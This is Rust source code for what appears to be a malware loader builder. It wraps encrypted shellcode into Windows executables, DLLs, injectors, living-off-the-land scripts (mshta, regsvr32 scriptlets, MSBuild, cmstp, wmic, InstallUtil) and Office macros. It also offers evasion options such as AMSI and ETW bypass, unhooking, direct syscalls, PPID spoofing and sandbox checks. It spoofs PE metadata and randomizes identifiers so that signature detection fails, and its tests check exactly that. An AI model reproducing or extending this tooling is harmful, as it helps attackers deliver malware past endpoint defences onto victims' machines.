use rand::{distributions::Alphanumeric, Rng};
use serde::Serialize;
use tera::{Context, Tera, Value};
use std::collections::HashMap;

#[derive(Debug, Clone, Copy, Serialize, PartialEq, Eq)]
pub enum LoaderType {
    // PE (compiled to Windows binary via rustc)
    Binary,
    Dll,
    AppDomain,
    Injector,
    Rundll32,

    // Script LOLBIN (pure text, no compilation)
    Wsf,
    Hta,
    Regsvr32Sct,
    MsBuild,
    Cmstp,
    WmicXsl,

    // Office VBA macro source (.bas text — user paste manually)
    DocxMacro,
    XlsxMacro,

    // .NET LOLBIN (compiled with csc.exe / mcs)
    InstallUtil,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OutputCategory {
    PeCompiled,     // Rust source → rustc
    ScriptText,     // Tera render → text file
    VbaText,        // Tera render → .bas text (copy-paste manually)
    DotNetCompiled, // C# source → csc.exe
}

impl LoaderType {
    pub fn category(self) -> OutputCategory {
        use LoaderType::*;
        match self {
            Binary | Dll | AppDomain | Injector | Rundll32 => OutputCategory::PeCompiled,
            Wsf | Hta | Regsvr32Sct | MsBuild | Cmstp | WmicXsl => OutputCategory::ScriptText,
            DocxMacro | XlsxMacro => OutputCategory::VbaText,
            InstallUtil => OutputCategory::DotNetCompiled,
        }
    }

    pub fn output_extension(self) -> &'static str {
        use LoaderType::*;
        match self {
            Binary | Injector => "exe",
            Dll | Rundll32 | InstallUtil => "dll",
            AppDomain => "dll", // also has .config sibling
            Wsf => "wsf",
            Hta => "hta",
            Regsvr32Sct => "sct",
            MsBuild => "csproj",
            Cmstp => "inf",
            WmicXsl => "xsl",
            DocxMacro | XlsxMacro => "bas",
        }
    }

    pub fn exec_command(self, filename: &str) -> String {
        use LoaderType::*;
        match self {
            Binary | Injector => filename.to_string(),
            Dll => format!("rundll32 {},DllMain", filename),
            Rundll32 => format!("rundll32 {},EntryPoint", filename),
            AppDomain => format!("Place {} + .config near host .exe; .NET loads it on startup", filename),
            Wsf => format!("wscript.exe {}", filename),
            Hta => format!("mshta.exe {}", filename),
            Regsvr32Sct => format!("regsvr32 /u /s /n /i:{} scrobj.dll", filename),
            MsBuild => format!("MSBuild.exe {}", filename),
            Cmstp => format!("cmstp.exe /au {}", filename),
            WmicXsl => format!("wmic os get /format:\"{}\"", filename),
            DocxMacro => "Open Word → Alt+F11 → ThisDocument → paste contents → save as .docm".to_string(),
            XlsxMacro => "Open Excel → Alt+F11 → ThisWorkbook → paste contents → save as .xlsm".to_string(),
            InstallUtil => format!("installutil.exe /logfile= /LogToConsole=false /U {}", filename),
        }
    }
}

#[derive(Debug, Clone, Serialize, PartialEq)]
pub enum Feature {
    DirectSyscall, UnhookDisk, UnhookKnownDlls, ModuleStomp,
    SleepEncrypt, StackSpoof,
    SandboxDomain, SandboxUser, PpidSpoof,
    AmsiHwbp, EtwHwbp,
    PeSpoofing, Staged, AppDomain, ThreadlessInject,
}

#[derive(Debug, Clone, Serialize, PartialEq)]
pub enum Encryption { Aes256, Chacha20 }

#[derive(Debug, Clone, Serialize)]
pub struct PeConfig {
    pub company: String,
    pub file_description: String,
    pub product_name: String,
    pub sign: bool,
}

#[derive(Debug, Clone, Serialize)]
pub struct AppDomainConfig {
    pub clr_version: String,
    pub net_version: String,
    pub target_process: String,
    pub assembly_hex: String,
    pub type_name: String,
    pub method_name: String,
    pub appdomain_name: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct LoaderConfig {
    pub loader_type: LoaderType,
    pub features: Vec<Feature>,
    pub encryption: Encryption,
    pub shellcode_hex: String,
    pub key_hex: String,
    pub iv_hex: String,
    pub pe_config: Option<PeConfig>,
    pub appdomain_config: Option<AppDomainConfig>,
}

#[derive(Debug, Clone, Serialize)]
pub struct AppDomainTemplateConfig {
    pub clr_version: String,
    pub net_version: String,
    pub appdomain_name: String,
}

fn rand_ident(len: usize) -> String {
    let mut rng = rand::thread_rng();
    let first: char = rng.gen_range(b'a'..=b'z') as char;
    let rest: String = (0..len.saturating_sub(1))
        .map(|_| rng.sample(Alphanumeric) as char)
        .collect();
    format!("{}{}", first, rest)
}

fn rand_clsid() -> String {
    let mut rng = rand::thread_rng();
    let segments: Vec<String> = [8usize, 4, 4, 4, 12]
        .iter()
        .map(|&n| (0..n).map(|_| format!("{:x}", rng.gen_range(0..16u8))).collect())
        .collect();
    segments.join("-").to_uppercase()
}

fn make_rand_ident_fn() -> impl tera::Function {
    move |args: &HashMap<String, Value>| {
        let len = args.get("len")
            .and_then(|v| v.as_u64())
            .unwrap_or(12) as usize;
        Ok(Value::String(rand_ident(len)))
    }
}

fn make_rand_hex_fn() -> impl tera::Function {
    move |args: &HashMap<String, Value>| {
        let len = args.get("len")
            .and_then(|v| v.as_u64())
            .unwrap_or(8) as usize;
        let s: String = (0..len)
            .map(|_| format!("{:02x}", rand::thread_rng().gen::<u8>()))
            .collect();
        Ok(Value::String(s))
    }
}

fn make_hex_bytes_filter() -> impl tera::Filter {
    move |value: &Value, _: &HashMap<String, Value>| {
        let hex = value.as_str().ok_or_else(|| tera::Error::msg("expected string"))?;
        let bytes: Vec<u8> = (0..hex.len())
            .step_by(2)
            .filter_map(|i| u8::from_str_radix(&hex[i..i+2], 16).ok())
            .collect();
        let json_bytes: Vec<Value> = bytes.iter().map(|&b| Value::Number(b.into())).collect();
        Ok(Value::Array(json_bytes))
    }
}

fn build_tera() -> Result<Tera, String> {
    let template_dir = concat!(env!("CARGO_MANIFEST_DIR"), "/templates/**/*");
    let mut tera = Tera::new(template_dir).map_err(|e| e.to_string())?;
    tera.register_function("rand_ident", make_rand_ident_fn());
    tera.register_function("rand_hex",   make_rand_hex_fn());
    tera.register_filter("hex_bytes",    make_hex_bytes_filter());
    Ok(tera)
}

fn build_context(config: &LoaderConfig) -> Context {
    let mut ctx = Context::new();
    ctx.insert("config", config);

    // Rust loader identifiers + extended identifiers for script/VBA/C# templates
    let mut vars: HashMap<&str, String> = HashMap::new();
    // Existing Rust loader idents
    for k in &[
        "var_shellcode", "var_key", "var_iv", "var_ptr",
        "var_region", "var_fiber", "fn_run", "fn_setup",
    ] {
        vars.insert(k, rand_ident(12));
    }
    // Script / VBA / C# extended idents
    for k in &[
        "fn_amsi", "fn_decrypt", "fn_hex2arr", "fn_hex", "fn_xor",
        "fn_exec", "var_sc", "var_key", "sub_amsi", "sub_run",
        "task_name", "target_name", "class_name", "namespace", "module_name",
        "fn_valloc", "fn_callwp", "fn_amsi_patch",
        "progid", "desc", "service_name", "short_name",
        "title", "app_id", "app_name", "job_id",
    ] {
        // var_key collides with existing key — last write wins; OK.
        vars.insert(k, rand_ident(10));
    }
    // Fixed-value placeholders (NOT identifiers)
    vars.insert("clsid", rand_clsid());
    vars.insert("scriptlet_url", "http://localhost/scriptlet.sct".to_string());
    // 16-byte dummy .NET stub (placeholder — real stub generation is out of v1 scope)
    vars.insert(
        "dotnet_stub_hex",
        "4d5a90000300000004000000ffff0000".to_string(),
    );

    ctx.insert("v", &vars);

    // Pass through top-level shellcode/key hex strings so templates can do `{{ shellcode_hex }}`.
    ctx.insert("shellcode_hex", &config.shellcode_hex);
    ctx.insert("key_hex", &config.key_hex);
    ctx.insert("iv_hex", &config.iv_hex);

    let feature_names: Vec<String> = config.features.iter()
        .map(|f| format!("{:?}", f))
        .collect();
    ctx.insert("feature_names", &feature_names);
    ctx
}

pub fn generate_loader_source(config: &LoaderConfig) -> Result<String, String> {
    let tera = build_tera()?;
    let ctx = build_context(config);

    let template_name = match config.loader_type {
        LoaderType::Binary    => "binary.rs.tera",
        LoaderType::Dll       => "dll.rs.tera",
        LoaderType::Rundll32  => "dll.rs.tera",
        LoaderType::AppDomain => "appdomain.rs.tera",
        LoaderType::Injector  => "injector.rs.tera",
        other => return Err(format!("not a PE loader type: {:?}", other)),
    };

    tera.render(template_name, &ctx).map_err(|e| e.to_string())
}

pub fn generate_script_source(config: &LoaderConfig) -> Result<String, String> {
    let tera = build_tera()?;
    let template_name = match config.loader_type {
        LoaderType::Wsf         => "script/wsf.xml.tera",
        LoaderType::Hta         => "script/hta.tera",
        LoaderType::Regsvr32Sct => "script/regsvr32.sct.tera",
        LoaderType::MsBuild     => "script/msbuild.csproj.tera",
        LoaderType::Cmstp       => "script/cmstp.inf.tera",
        LoaderType::WmicXsl     => "script/wmic.xsl.tera",
        other => return Err(format!("not a script type: {:?}", other)),
    };
    let ctx = build_context(config);
    tera.render(template_name, &ctx).map_err(|e| e.to_string())
}

pub fn generate_vba_source(config: &LoaderConfig) -> Result<String, String> {
    let tera = build_tera()?;
    let template_name = match config.loader_type {
        LoaderType::DocxMacro => "office/vba_word.bas.tera",
        LoaderType::XlsxMacro => "office/vba_excel.bas.tera",
        other => return Err(format!("not a VBA type: {:?}", other)),
    };
    let ctx = build_context(config);
    tera.render(template_name, &ctx).map_err(|e| e.to_string())
}

pub fn generate_csharp_source(config: &LoaderConfig) -> Result<String, String> {
    let tera = build_tera()?;
    let ctx = build_context(config);
    tera.render("csharp/installutil.cs.tera", &ctx).map_err(|e| e.to_string())
}

pub fn generate_appdomain_config(config: &AppDomainTemplateConfig) -> Result<String, String> {
    let tera = build_tera()?;
    let mut ctx = Context::new();
    ctx.insert("clr_version",    &config.clr_version);
    ctx.insert("net_version",    &config.net_version);
    ctx.insert("appdomain_name", &config.appdomain_name);
    tera.render("appdomain.config.tera", &ctx).map_err(|e| e.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_binary_no_plain_identifiers() {
        let config = LoaderConfig {
            loader_type: LoaderType::Binary,
            features: vec![Feature::SleepEncrypt, Feature::AmsiHwbp],
            encryption: Encryption::Aes256,
            shellcode_hex: "deadbeef".into(),
            key_hex: "aa".repeat(32),
            iv_hex: "bb".repeat(16),
            pe_config: None,
            appdomain_config: None,
        };
        let result = generate_loader_source(&config).unwrap();
        assert!(!result.contains("let shellcode "));
        assert!(!result.contains("let key "));
        assert!(result.contains("de") || result.contains("ad")); // shellcode bytes present
    }

    #[test]
    fn test_appdomain_config_xml() {
        let config = AppDomainTemplateConfig {
            clr_version: "v4.0.30319".into(),
            net_version: "4.0".into(),
            appdomain_name: "DefaultDomain".into(),
        };
        let xml = generate_appdomain_config(&config).unwrap();
        assert!(xml.contains("v4.0.30319"));
        assert!(xml.contains("DefaultDomain"));
        assert!(xml.contains("<configuration>"));
    }

    #[test]
    fn test_dll_template_has_dll_main() {
        let config = LoaderConfig {
            loader_type: LoaderType::Dll,
            features: vec![Feature::AmsiHwbp],
            encryption: Encryption::Aes256,
            shellcode_hex: "cafebabe".into(),
            key_hex: "aa".repeat(32),
            iv_hex: "bb".repeat(16),
            pe_config: None,
            appdomain_config: None,
        };
        let source = generate_loader_source(&config).unwrap();
        assert!(source.contains("DllMain"));
        assert!(source.contains("DllRegisterServer"));
    }
}
